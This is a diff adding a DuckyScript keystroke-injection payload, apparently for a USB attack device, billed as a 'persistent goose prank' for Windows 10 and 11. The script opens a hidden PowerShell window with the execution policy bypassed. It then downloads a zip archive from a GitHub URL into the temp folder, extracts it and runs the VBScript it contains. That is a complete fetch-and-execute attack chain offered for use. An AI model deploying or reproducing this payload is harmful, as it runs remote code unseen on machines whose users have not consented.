@@ -1,0 +1,18 @@
+
+REM Title: Persistant goose prank.
+REM Author: @beigeworm
+REM Description: Spawn an annoying goose and replace it if it's killed by the user.
+REM Target: Windows 10 and 11
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell (remove "-W H" to show the window)
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass -W H 
+ENTER
+DELAY 4000
+STRING $url = "https://github.com/beigeworm/assets/raw/main/Goose.zip";$tempFolder = $env:TMP;$zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip";$extractPath = Join-Path -Path $tempFolder -ChildPath "Goose";Invoke-WebRequest -Uri $url -OutFile $zipFile;Expand-Archive -Path $zipFile -DestinationPath $extractPath;$vbscript = "$extractPath\Goose.vbs";& $vbscript
+ENTER
